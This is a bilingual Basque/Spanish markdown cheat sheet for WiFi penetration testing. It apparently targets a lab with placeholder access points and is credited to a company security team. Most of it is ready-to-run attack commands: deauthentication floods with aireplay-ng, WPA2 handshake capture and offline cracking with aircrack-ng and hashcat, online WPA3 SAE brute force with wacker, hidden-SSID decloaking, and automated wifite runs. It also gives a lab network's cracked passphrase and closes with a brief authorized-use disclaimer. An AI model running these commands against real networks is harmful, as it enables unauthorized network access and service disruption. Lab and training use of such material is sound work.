# WiFi Pentest - Komandoen Erreferentzia Azkarra
## Gu√≠a R√°pida de Comandos para Pentesting WiFi

---

## üîß Preparaci√≥n / Preparaci√≥n

### Interfazea monitor moduan jarri / Poner interfaz en modo monitor
```bash
# Erabili aurretik / Antes de usar
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up

# Egiaztatu / Verificar
iwconfig wlan0
```

### Monitor modutik itzuli / Volver a modo managed
```bash
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode managed
sudo ip link set wlan0 up
```

---

## üì° 1. AP-Guest: Sare Irekia / Red Abierta

### Deskubrimendua / Descubrimiento
```bash
# AP eta bezeroak eskaneatu / Escanear APs y clientes
sudo airodump-ng wlan0 --channel 6

# Zehaztasun gehiagorekin / Con m√°s detalle
sudo airodump-ng -c 6 --bssid 02:00:00:00:04:00 -w guest_capture wlan0
```

### Trafikoaren analisia / An√°lisis de tr√°fico
```bash
# Live capture / Captura en vivo
sudo tcpdump -i wlan0 -nn -e ether host 02:00:00:00:04:00

# Wireshark-rekin ireki / Abrir con Wireshark
sudo wireshark guest_capture-01.cap &
```

---

## üîê 2. AP-Bridged: WPA2-PSK Krakinga / Cracking WPA2-PSK

### 1. Fasea: Handshake harrapatzea / Capturar handshake
```bash
# Terminal 1: AP eta bezeroak monitorizatu
sudo airodump-ng -c 1 --bssid 02:00:00:00:03:00 \
    -w wpa2_capture wlan0

# Terminal 2: Deauth ataka bidali (bezeroa birkonektatzera behartzeko)
sudo aireplay-ng -0 10 \
    -a 02:00:00:00:03:00 \
    -c 02:00:00:00:CC:DD \
    wlan0
```

### 2. Fasea: Handshake crack / Crackear handshake
```bash
# Wordlist eraso batekin / Ataque con wordlist
sudo aircrack-ng wpa2_capture-01.cap \
    -w /usr/share/wordlists/rockyou.txt

# Hashcat erabiliz (GPU azkartuak) / Usando Hashcat
hcxpcapngtool -o hash.hc22000 wpa2_capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### 3. Fasea: Konektatu / Conectar
```bash
# wpa_supplicant konfigurazioa
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="AP-Bridged"
    psk="thebridge"
}

# Konektatu
sudo wpa_supplicant -c wpa.conf -i wlan0
sudo dhclient wlan0
```

---

## üõ°Ô∏è 3. AP-WPA3: SAE Brute-Force

### wacker instalazioa / Instalaci√≥n wacker
```bash
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker
pip install -r requirements.txt
```

### Erasoaren exekuzioa / Ejecuci√≥n del ataque
```bash
# SAE online brute-force
sudo python wacker.py \
    -i wlan0 \
    -b 02:00:00:00:05:00 \
    -s "AP-WPA3" \
    -w /usr/share/wordlists/rockyou.txt

# Azalpena:
# -i: Interfazea
# -b: BSSID (AParen MAC helbidea)
# -s: SSID
# -w: Wordlist
```

### Dragonfly handshake analisia / An√°lisis Dragonfly
```bash
# tshark filtroak / filtros tshark
sudo tshark -i wlan0 -Y "wlan.sa == 02:00:00:00:05:00" \
    -T fields -e wlan.sa -e wlan.da -e frame.len
```

---

## üëÅÔ∏è 4. AP-Hidden: SSID Decloaking

### 5GHz banda eskaneatzea / Escanear banda 5GHz
```bash
# 5GHz eskaneatzea / Escanear 5GHz
sudo airodump-ng --band a wlan0

# Kanal zehatza / Canal espec√≠fico
sudo airodump-ng --band a -c 36 wlan0
```

### SSID ezkutua identifikatu / Identificar SSID oculto
```bash
# AP ezkutua begizta / Observar AP oculto
sudo airodump-ng -c 36 --bssid 02:00:00:00:06:00 \
    -w hidden_capture wlan0

# Analisia / An√°lisis
# Bezero bat konektatzean, SSID agertuko da
```

### Probe request/response iragaztea / Filtrar probe requests
```bash
# tshark-rekin / Con tshark
sudo tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x05" \
    -T fields -e wlan.ssid

# 5GHz-n soilik / Solo en 5GHz
sudo tshark -i wlan0 -Y "wlan_radio.channel == 36"
```

---

## üß∞ Tresna Osagarriak / Herramientas Adicionales

### Kismet (Network Detector)
```bash
# Instalatu / Instalar
sudo apt install kismet

# Exekutatu / Ejecutar
sudo kismet -c wlan0
```

### Wifite (Automatizazioa)
```bash
# Instalatu / Instalar
sudo apt install wifite

# Exekutatu / Ejecutar
sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt
```

### Bettercap (MITM Framework)
```bash
# Instalatu / Instalar
sudo apt install bettercap

# WiFi modulua / M√≥dulo WiFi
sudo bettercap -iface wlan0

# Barnean / Dentro:
# ¬ª wifi.recon on
# ¬ª wifi.show
```

### hcxtools (Modernoak / Modernas)
```bash
# Instalatu / Instalar
sudo apt install hcxtools

# Captura formatu bihurketa / Conversi√≥n formato captura
hcxpcapngtool -o hash.hc22000 -E wordlist capture.cap

# Hash info / Info del hash
hcxhashtool -i hash.hc22000 --info=stdout
```

---

## üìä Analisia eta Emanitzak / An√°lisis y Reportes

### Capinfok erabiliz / Usando capinfos
```bash
# Capture fitxategiaren informazioa / Info archivo capture
capinfos capture.cap
```

### Aircrack-ng exportazioa / Exportaci√≥n aircrack
```bash
# E-ari esportatu / Exportar a CSV
aircrack-ng capture.cap -J capture_john
```

### Evidencia bilketa / Recolecci√≥n de evidencias
```bash
# Data eta orduarekin / Con fecha y hora
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
mkdir -p evidencias/$TIMESTAMP

# Kopiatu fitxategiak / Copiar archivos
cp *.cap evidencias/$TIMESTAMP/
cp *.csv evidencias/$TIMESTAMP/
```

---

## ‚ö†Ô∏è Segurtasun Oharrak / Notas de Seguridad

### Legezkotasuna / Legalidad
```bash
# *** OHARRA GARRANTZITSUA / NOTA IMPORTANTE ***
# Tresna hauek soilik erabili hacking etiko baimenduan!
# Ez erabili baimenik gabe!
#
# Estas herramientas solo para hacking √©tico autorizado!
# ¬°No usar sin permiso!
```

### Ezinbesteko konfigurazioa / Configuraci√≥n esencial
```bash
# txpower mugatu (legezkoak betetzeko) / Limitar txpower
sudo iwconfig wlan0 txpower 20dBm

# Kanal legezkoak soilik / Solo canales legales
# (Europa: 1-13, 36-64, 100-140)
sudo airodump-ng wlan0 --channel 1,6,11
```

---

## üîó Erreferentziak / Referencias

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [WPA3 Dragonblood](https://wpa3.mathyvanhoef.com/)
- [802.11 Frame Types](https://community.cisco.com/t5/security-knowledge-base/802-11-frames-a-starter-guide-to-learn-wireless-sniffer-traces/ta-p/3117559)
- [WiFi Pentesting Guide](https://github.com/sealingtech/wifi-ctf)

---

*Dokumentazio hau Zabala Gailetak-eko segurtasun-taldeak garatu du.*  
*Documentaci√≥n desarrollada por el equipo de seguridad de Zabala Gailetak.*
